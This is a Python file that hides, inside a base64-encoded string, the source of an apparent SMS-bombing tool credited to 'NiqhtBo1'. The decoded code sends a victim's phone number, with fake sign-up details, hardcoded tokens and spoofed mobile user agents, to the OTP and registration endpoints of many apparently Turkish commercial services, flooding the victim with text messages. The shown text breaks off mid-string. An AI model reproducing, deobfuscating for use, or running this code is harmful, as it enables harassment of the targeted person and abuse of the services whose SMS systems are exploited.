import base64
siktirgit="CiNKQUxLU0pGS0xBVUpTRkpXSEJBS0pTSEVBV0pLRkJBV0xSSlVRV0tMRTFKMkxLSlNMS0RKMktMNUpBU0tGSlNNQ05BTVNIVzEzMjRKS0xIQVNGV0hBSlNLSEFKS1dTSEFXSktGQSMKI0pBTEtTSkZLR0hERkpMQVVKU0ZKV0hCQUtKU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLSkZHSEpMNUpBU0tGSlNNQ05BTVNIVzEzMjRKS0xIQVNGV0hBSlNLSEFKS1dTSEFXSktGQSNISgojSkFMS1NKRktMQVVKU0ZKV0hCQUtKU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLTDVKQVNLRkpTTUNOQU1TSFcxMzI0SktMSEFTRldIQUpTS0hBSktXU0hBV0pLRkEjCiNKQUxLU0pGS0xBVUpTRkpXSEJBU0ZHU0RHS0pTSEVBV0pLRkJBV0xSRkdISlVRV0tMRTFKMkxLSlNMS0RKMktMNUpBU0tGSlNNQ05BTVNIVzEzMjRKS0xIQVNGV0hBSlNLSEFKS1dTSEFXSktGQSMKI0pBTEtISkdISkdTSkZLTEFVSlNKRkdLRkdGSldIQkFLSlNIRUFXSEpGR0pLRkJBV0xGR0pGR1JKVVFXS0xFMUoyTEtKU0xLREpGR0hKMktMNUpBU0tGSlNNQ05BTVNGR0pGSEhXMTMyNEpLTEhBU0ZXSEFKU0tIQUpLV1NIQVdKS0ZBIwojSkFMS1NKRktMU0ZESERGQVVKU0ZKV0hCQUtKU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLTDVKQVNLRkpTTUNOQU1TSFcxMzI0SktMSEFTRldIQUpTS0hBSktXU0hBV0pLRkEjCiNKR1NERkdERkFMS1NKRktMQVVKU0ZKV0hCQVNGV0FBS0pTSEVBV0pLRkJBV0xSSlVRV0tMRTFKMkxLSlNMS0RKMktMNUpBU0tGSlNNQ05BTVNIVzEzMjRKS0xIQVNGV0hBSlNLSEFKS1dTSEFXSktGQSMKI0pBTEtTSkZLTEFVSkZHSlNGSldIQkFLSlNIRUFXSktGQkFXTFJKVVFXS0xFMUoyTEtKU0xLREhGR0pKMktMNUpBU0tGSlNNQ05BTVNIVzEzMjRKS0xIQVNGV0hBSlNLSEFKS1dTSEFXSktGQSMKI0pBTEtTSERGR0pGS0xBVUpTRkpXSEpIRkdCQUtKU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLTDVKQVNLRkpTTUNOQU1TSFcxMzI0SktMSEFTRldIQUpTS0hBSktXU0hBV0pLRkEjCiNKQUxLU0pGS0xBVUpTRkpXSEJBS0pTSEVBV0pLRkJBV0xSSlVRV0tMRTFKMkxLSlNMS0RKRkdIRkoyS0w1SkFTS0ZKU01DTkFNU0hXMTMyNEpLTEhBU0ZXSEFKU0tIQUpLV1NIQVdKS0ZBIwojSkFMS1NGR0pGSkZLTEFVSlNGSldIQkFLSlNIRUFXSktGQkFXTFJKVVFXS0xFMUoyTEtKU0xLREoyS0w1SkFTS0ZKU01DTkFNU0hXMTMyNEpLTEhBU0ZXSEFKU0tIQUpLV1NIQVdKS0ZBIwojSkFMS1NKRktMQVVKU0ZKV0hCQUtKU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLTDVKQVNLRkpTTUNOQU1TSFcxMzI0SktMSEFTRldIQUpTS0hBSktXU0hBV0pLRkEjCiNKQUxLU0pGS0xBVUpTRkpXSEJBS0pTSEVBV0pLRkJBV0xSSlVRV0tMRTFKMkxLSlNMS0RKMktMNUpBU0tGSlNNQ05BTVNIVzEzMjRKS0xIQVNGV0hBSlNLSEFKS1dTSEFXSktGQSMKI0pBTEtTSkZLTEFVRkdIRkdISlNGSldIQkFLSlNIRUFXSktGQkFXTFJKVVFXS0xFMUoyTEtKU0xLREoyS0w1SkFTS0ZKU01DTkFNU0hXMTMyNEpLTEhBU0ZXSEFKU0tIQUpLV1NIQVdKS0ZBIwojSkFMS1NKRktMQVVKU0ZKV0hCQUtKRkpGR0pGU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLTDVKQVNLRkpTTUNOQU1TSFcxMzI0SktMSEFTRldIQUpTS0hBSktXU0hBV0pLRkEjCiNKQUxLU0pGS0xBVUpTRkpXSEJBS0pTSEVBV0pLRkJBV0xSSlVRV0tMRTFKMkxLSlNMS0RKMktMNUpBR0hGR0hTS0ZKU01DTkFNU0hXMTMyNEpLTEhBU0ZXSEFKU0tIQUpLV1NIQVdKS0ZBIyNKQUxLU0pGS0wjQVVKU0ZKV0hCQUtKU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLTDVKQVNLRkpTTUNOQU1TSFcxMzI0SktMSEFTRldIQUpTS0hBSktXU0hBV0pLRkEjCiNKQUxLU0pGS0xBVUpTRkpXSEJBS0pTSEVBV0pLRkJBV0xSSlVRV0tMRTFKMkxLSlNMS0RKMktMNUpBU0tGSlNNQ05BTVNIVzEzMjRKS0xIQVNGV0hBSlNLSEFKS1dTSEFXSktGQSMKI0pBTEtTSkZLTEFVSlNGSldIQkFLSlNIRUFXSktGQkFXTFJKVVFXS0xFMUoyTEtKU0xLREoyS0w1SkFTS0ZKU01DTkFNU0hXMTMyNEpLTEhBU0ZXSEFKU0tIQUpLV1NIQVdKS0ZBIwojSkFMS1NKRktMQVVKU0ZKV0hCQUtKU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLTDVKQVNLRkpTTUNOQU1TSFcxMzI0SktMSEFTRldIQUpTS0hBSktXU0hBV0pLRkEjCiNKQUxLU0pGS0xBVUpTRkpXSEJBS0pTSEVBV0pLRkJBV0xSSlVRV0tMRTFKMkxLSlNMS0RKMktMNUpBU0tGSlNNQ05BTVNIVzEzMjRKS0xIQVNGV0hBSlNLSEFKS1dTSEFXSktGQSMKI0pBTEtTSkZLTEFVSlNGSldIQkFLSlNIRUFXSktGQkFXTFJKVVFXS0xFMUoyTEtKU0xLREoyS0w1SkFTS0ZKU01DTkFNU0hXMTMyNEpLTEhBU0ZXSEFKU0tIQUpLV1NIQVdKS0ZBIwojSkFMS1NKRktMQVVKU0ZKV0hCQUtKU0hFQVdKS0ZCQVdMUkpVUVdLTEUxSjJMS0pTTEtESjJLTDVKQVNLRkpTTUNOQU1TSFcxMzI0SktMSEFTRldIQUpTS0hBSktXU0hBV0pLRkEjCgoKaW1wb3J0IHJlcXVlc3RzCmZyb20gcmFuZG9tIGltcG9ydCBjaG9pY2UKZnJvbSBzdHJpbmcgaW1wb3J0IGFzY2lpX2xvd2VyY2FzZQpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZQoKCmNsYXNzIFNlbmRTbXMoKToKICAgIGFkZXQgPSAwCgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHBob25lLCBtYWlsKToKICAgICAgICBzZWxmLnBob25lID0gc3RyKHBob25lKQogICAgICAgIGlmIGxlbihtYWlsKSAhPSAwOgogICAgICAgICAgICBzZWxmLm1haWwgPSBtYWlsCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc2VsZi5tYWlsID0gJycuam9pbihjaG9pY2UoYXNjaWlfbG93ZXJjYXNlKSBmb3IgaSBpbiByYW5nZSgxOSkpICsgIkBnbWFpbC5jb20iCgogICAgICAgICMga2FodmVkdW55YXNpLmNvbQoKICAgIGRlZiBLYWh2ZUR1bnlhc2koc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBrYWh2ZV9kdW55YXNpID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9jb3JlLmthaHZlZHVueWFzaS5jb20vYXBpL3VzZXJzL3Ntcy9zZW5kIiwgZGF0YT17CiAgICAgICAgICAgICAgICAibW9iaWxlX251bWJlciI6IHNlbGYucGhvbmUsCiAgICAgICAgICAgICAgICAidG9rZW5fdHlwZSI6ICJyZWdpc3Rlcl90b2tlbiIKICAgICAgICAgICAgfSkKICAgICAgICAgICAgaWYgbGVuKGthaHZlX2R1bnlhc2kuanNvbigpWyJtZXRhIl1bIm1lc3NhZ2VzIl1bImVycm9yIl0pID09IDA6CiAgICAgICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUR1JFRU5fRVh9TWFkZSBCeSBOaXFodEJvMSB8IFsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGNvcmUua2FodmVkdW55YXNpLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVFJFRF9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGNvcmUua2FodmVkdW55YXNpLmNvbSIpCgogICAgICAgICMgd21mLmNvbS50cgoKICAgIGRlZiBXbWYoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3bWYgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3d3dy53bWYuY29tLnRyL3VzZXJzL3JlZ2lzdGVyLyIsIGRhdGE9ewogICAgICAgICAgICAgICAgImNvbmZpcm0iOiAidHJ1ZSIsCiAgICAgICAgICAgICAgICAiZGF0ZV9vZl9iaXJ0aCI6ICIxOTU2LTAzLTAxIiwKICAgICAgICAgICAgICAgICJlbWFpbCI6IHNlbGYubWFpbCwKICAgICAgICAgICAgICAgICJlbWFpbF9hbGxvd2VkIjogInRydWUiLAogICAgICAgICAgICAgICAgImZpcnN0X25hbWUiOiAiTWVtYXRpIiwKICAgICAgICAgICAgICAgICJnZW5kZXIiOiAibWFsZSIsCiAgICAgICAgICAgICAgICAibGFzdF9uYW1lIjogIkJhcyIsCiAgICAgICAgICAgICAgICAicGFzc3dvcmQiOiAiMzFBQkMuLmFiYzMxIiwKICAgICAgICAgICAgICAgICJwaG9uZSI6IGYiMHtzZWxmLnBob25lfSIKICAgICAgICAgICAgfSkKICAgICAgICAgICAgaWYgd21mLnN0YXR1c19jb2RlID09IDIwMjoKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gd21mLmNvbS50ciIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVFJFRF9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IHdtZi5jb20udHIiKQoKICAgICAgICAjIHRpa2xhZ2Vsc2luLmNvbQoKICAgIGRlZiBUaWtsYUdlbHNpbihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3N2Yy5hcHBzLnRpa2xhZ2Vsc2luLmNvbTo0NDMvdXNlci9ncmFwaHFsIgogICAgICAgICAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsICJYLU1lcmNoYW50LVR5cGUiOiAiMCIsICJBY2NlcHQiOiAiKi8qIiwKICAgICAgICAgICAgICAgICAgICAgICAiQXBwdmVyc2lvbiI6ICIyLjQuMSIsICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJYLU5vLUF1dGgiOiAidHJ1ZSIsICJVc2VyLUFnZW50IjogIlRpa2xhR2Vsc2luLzgwOSBDRk5ldHdvcmsvMTMzNS4wLjMuMiBEYXJ3aW4vMjEuNi4wIiwKICAgICAgICAgICAgICAgICAgICAgICAiWC1EZXZpY2UtVHlwZSI6ICIyIn0KICAgICAgICAgICAganNvbiA9IHsib3BlcmF0aW9uTmFtZSI6ICJHRU5FUkFURV9PVFAiLAogICAgICAgICAgICAgICAgICAgICJxdWVyeSI6ICJtdXRhdGlvbiBHRU5FUkFURV9PVFAoJHBob25lOiBTdHJpbmcsICRjaGFsbGVuZ2U6IFN0cmluZywgJGRldmljZVVuaXF1ZUlkOiBTdHJpbmcpIHtcbiAgZ2VuZXJhdGVPdHAocGhvbmU6ICRwaG9uZSwgY2hhbGxlbmdlOiAkY2hhbGxlbmdlLCBkZXZpY2VVbmlxdWVJZDogJGRldmljZVVuaXF1ZUlkKVxufVxuIiwKICAgICAgICAgICAgICAgICAgICAidmFyaWFibGVzIjogeyJjaGFsbGVuZ2UiOiAiM2Q2ZjlmZjktODZjZS00YmYzLThiYTktNGE4NWNhOTc1ZTY4IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkZXZpY2VVbmlxdWVJZCI6ICI3MjA5MzJENS00N0JELTQ2Q0QtQTRCOC0wODZFQzQ5RjgxQUIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBob25lIjogZiIrOTB7c2VsZi5waG9uZX0ifX0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbImRhdGEiXVsiZ2VuZXJhdGVPdHAiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBzdmMuYXBwcy50aWtsYWdlbHNpbi5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRSRURfRVh9TWFkZSBCeSBOaXFodEJvMSB8IFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBzdmMuYXBwcy50aWtsYWdlbHNpbi5jb20iKQoKICAgICAgICAjIGF5eWlsZGl6LmNvbS50cgoKICAgIGRlZiBBeXlpbGRpeihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly9hcGkuYWx0aW55aWxkaXpjbGFzc2ljcy5jb206NDQzL21vYmlsZWFwaTIvYXV0YXBpL0NyZWF0ZVNtc090cEZvclJlZ2lzdGVyP2dzbT17c2VsZi5waG9uZX0iCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkFjY2VwdCI6ICIqLyoiLAogICAgICAgICAgICAgICAgICAgICAgICJUb2tlbiI6ICJNWFo1TlRKODJXWEJVSkI3S0JQMTBBR1IzQUY2UzRHQjk1VlpEVTRHNDRKRkVJTjNXSVNBQzJLTFJJQk5PTlE3UVZDWlhNM1pISTY2MUFNVlhMS0pMRjlIVUtJNVNRMlJPTVpTIiwKICAgICAgICAgICAgICAgICAgICAgICAiRGV2aWNldHlwZSI6ICJtb2JpbGVhcHAiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogImFsdGlueWlsZGl6LzIuNyAoY29tLmJybWFnYXphY2lsaWsuYWx0aW55aWxkaXo7IGJ1aWxkOjI7IGlPUyAxNS43LjcpIEFsYW1vZmlyZS8yLjciLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVFI7cT0xLjAsIHRyLVRSO3E9MC45In0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJTdWNjZXNzIl0gPT0gVHJ1ZToKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLmFsdGlueWlsZGl6Y2xhc3NpY3MuY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUUkVEX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gYXBpLmFsdGlueWlsZGl6Y2xhc3NpY3MuY29tIikKCiAgICAgICAgIyBuYW9zc3RhcnMuY29tCgogICAgZGVmIE5hb3NzdGFycyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2FwaS5uYW9zc3RhcnMuY29tOjQ0My9hcGkvc21zU2VuZC85YzlmYTg2MS1jYzVkLTQzYjAtYjRlYS0xYjU0MWJlMTUzNTAiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IlVuaXFpZCI6ICI5YzlmYTg2MS1jYzVkLTQzYzAtYjRlYS0xYjU0MWJlMTUzNTEiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIm5hb3NzdGFycy8xLjAwMzAgQ0ZOZXR3b3JrLzEzMzUuMC4zLjIgRGFyd2luLzIxLjYuMCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbiI6ICIqIiwgIkxvY2FsZSI6ICJlbi1UUiIsICJWZXJzaW9uIjogIjEuMDAzMCIsICJPcyI6ICJpb3MiLAogICAgICAgICAgICAgICAgICAgICAgICJBcGl1cmwiOiAiaHR0cHM6Ly9hcGkubmFvc3N0YXJzLmNvbS9hcGkvIiwgIkRldmljZS1JZCI6ICJENDFDRTVGMy01M0JCLTQyQ0YtODYxMS1CNEZFNzUyOUM5QkMiLAogICAgICAgICAgICAgICAgICAgICAgICJQbGF0Zm9ybSI6ICJpb3MiLCAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwgIlRpbWV6b25lIjogIkV1cm9wZS9Jc3RhbmJ1bCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkdsb2JhbHV1aWR2NCI6ICJkNTdiZDVkMi1jZjFlLTQyMGMtYjQzZC02MTExN2NmOWI1MTciLCAiVGltZXpvbmVvZmZzZXQiOiAiLTE4MCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uIiwgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCAiQXBpdHlwZSI6ICJtb2JpbGVfYXBwIn0KICAgICAgICAgICAganNvbiA9IHsidGVsZXBob25lIjogZiIrOTB7c2VsZi5waG9uZX0iLCAidHlwZSI6ICJyZWdpc3RlciJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBhcGkubmFvc3N0YXJzLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVFJFRF9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGFwaS5uYW9zc3RhcnMuY29tIikKCiAgICAgICAgIyBiaW0KCiAgICBkZWYgQmltKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgYmltID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9iaW0udmVlc2submV0OjQ0My9zZXJ2aWNlL3YxLjAvYWNjb3VudC9sb2dpbiIsIGpzb249eyJwaG9uZSI6IHNlbGYucGhvbmV9KQogICAgICAgICAgICBpZiBiaW0uc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBiaW0udmVlc2submV0IikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUUkVEX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gYmltLnZlZXNrLm5ldCIpCgogICAgICAgICMgZW5nbGlzaGhvbWUuY29tCgogICAgZGVmIEVuZ2xpc2hob21lKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZGF0YSA9IHsiZmlyc3RfbmFtZSI6ICJNZW1hdGkiLCAibGFzdF9uYW1lIjogIkJhcyIsICJlbWFpbCI6IHNlbGYubWFpbCwgInBob25lIjogZiIwe3NlbGYucGhvbmV9IiwKICAgICAgICAgICAgICAgICAgICAicGFzc3dvcmQiOiAiMzFBQkMuLmFiYzMxIiwgImVtYWlsX2FsbG93ZWQiOiAidHJ1ZSIsICJzbXNfYWxsb3dlZCI6ICJ0cnVlIiwgImNvbmZpcm0iOiAidHJ1ZSIsCiAgICAgICAgICAgICAgICAgICAgInRvbV9wYXlfYWxsb3dlZCI6ICJ0cnVlIn0KICAgICAgICAgICAgaG9tZSA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vd3d3LmVuZ2xpc2hob21lLmNvbTo0NDMvZW5oX2FwcC91c2Vycy9yZWdpc3RyYXRpb24vIiwgZGF0YT1kYXRhKQogICAgICAgICAgICBpZiBob21lLnN0YXR1c19jb2RlID09IDIwMjoKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gZW5nbGlzaGhvbWUuY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUUkVEX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gZW5nbGlzaGhvbWUuY29tIikKCiAgICAgICAgIyBpY3EubmV0CgogICAgZGVmIEljcShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly91LmljcS5uZXQ6NDQzL2FwaS92OTAvc21zcmVnL3JlcXVlc3RQaG9uZVZhbGlkYXRpb24ucGhwP2NsaWVudD1pY3EmZj1qc29uJms9Z3UxOVBOQmJsUWpDZGJNVSZsb2NhbGU9ZW4mbXNpc2RuPSUyQjkwe3NlbGYucGhvbmV9JnBsYXRmb3JtPWlvcyZyPTc5NjM1NjE1MyZzbXNGb3JtYXRUeXBlPWh1bWFuIgogICAgICAgICAgICBoZWFkZXJzID0geyJBY2NlcHQiOiAiKi8qIiwgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIklDUSBpT1MgI25vX3VzZXJfaWQjIGd1MTlQTkJibFFqQ2RiTVUgMjMuMS4xKDEyNDEwNikgMTUuNy43IGlQaG9uZTksNCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICBpZiByLmpzb24oKVsicmVzcG9uc2UiXVsic3RhdHVzQ29kZSJdID09IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gdS5pY3EubmV0IikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUUkVEX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gdS5pY3EubmV0IikKCiAgICAgICAgIyBldmlkZWEuY29tCgogICAgZGVmIEV2aWRlYShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3d3dy5ldmlkZWEuY29tOjQ0My91c2Vycy9yZWdpc3Rlci8iCiAgICAgICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlIjogIm11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PWZEbHdTemtaVTlEVzVNY3RJeE9pNEVJc1lCOUxLTVIxenliNWRPdWlKcGpwUW9LMVZQalN5cWR4SGZxUGRtM2lIYUtjemkiLAogICAgICAgICAgICAgICAgIlgtUHJvamVjdC1OYW1lIjogInVuZGVmaW5lZCIsICJBY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIiwKICAgICAgICAgICAgICAgICJYLUFwcC1UeXBlIjogImFraW5vbi1tb2JpbGUiLCAiWC1SZXF1ZXN0ZWQtV2l0aCI6ICJYTUxIdHRwUmVxdWVzdCIsCiAgICAgICAgICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogInRyLVRSLHRyO3E9MC45IiwgIkNhY2hlLUNvbnRyb2wiOiAibm8tc3RvcmUiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgIlgtQXBwLURldmljZSI6ICJpb3MiLCAiUmVmZXJlciI6ICJodHRwczovL3d3dy5ldmlkZWEuY29tLyIsCiAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJFdmlkZWEvMSBDRk5ldHdvcmsvMTMzNS4wLjMgRGFyd2luLzIxLjYuMCIsCiAgICAgICAgICAgICAgICAiWC1Dc3JmdG9rZW4iOiAiN05kSmJXU1luT2RtNzBZVkxJeXpteWxad1dicUxGYnRzcmNDUWRMQUVibng3YTVUcTRuampTM2dFRWxaeFlwcyJ9CiAgICAgICAgICAgIGRhdGEgPSBmIi0tZkRsd1N6a1pVOURXNU1jdEl4T2k0RUlzWUI5TEtNUjF6eWI1ZE91aUpwanBRb0sxVlBqU3lxZHhIZnFQZG0zaUhhS2N6aVxyXG5jb250